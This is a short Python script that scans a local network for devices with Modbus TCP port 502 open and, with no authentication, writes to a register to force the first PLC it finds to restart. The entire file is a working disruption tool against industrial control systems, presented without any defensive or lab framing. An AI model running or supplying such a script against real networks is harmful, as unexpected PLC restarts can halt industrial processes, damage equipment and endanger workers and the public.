import os
import nmap
from pyModbusTCP.client import ModbusClient
import time

# Function to find PLC's IP on the network
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network to find PLC...")
    scanner = nmap.PortScanner()
    scanner.scan(hosts=network_range, arguments='-p 502 --open')  # Modbus typically uses port 502
    
    for host in scanner.all_hosts():
        if scanner[host].has_tcp(502) and scanner[host]['tcp'][502]['state'] == 'open':
            print(f"[+] Found potential PLC at {host}")
            return host
    print("[-] No PLC found on the network.")
    return None

# Function to restart the PLC using Modbus TCP
def restart_plc(plc_ip):
    print(f"[*] Attempting to restart PLC at {plc_ip}...")
    
    # Connect to PLC via Modbus TCP
    client = ModbusClient(host=plc_ip, port=502, auto_open=True)
    
    if not client.is_open():
        print(f"[-] Unable to connect to PLC at {plc_ip}")
        return False
    
    try:
        # Example: Write to a specific Modbus register responsible for system reset.
        # Typically, vendors have a specific coil/register for restart/shutdown.
        SYSTEM_RESET_REGISTER = 0x0000  # This address changes based on the PLC model
        SYSTEM_RESET_VALUE = 1  # Value to trigger a restart

        print("[*] Sending restart command...")
        success = client.write_single_register(SYSTEM_RESET_REGISTER, SYSTEM_RESET_VALUE)

        if success:
            print("[+] Restart command sent successfully!")
        else:
            print("[-] Failed to send restart command.")
    
    except Exception as e:
        print(f"[-] Error interacting with PLC: {str(e)}")
    
    finally:
        client.close()

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        restart_plc(plc_ip)
    else:
        print("[-] Exiting as no PLC was found.")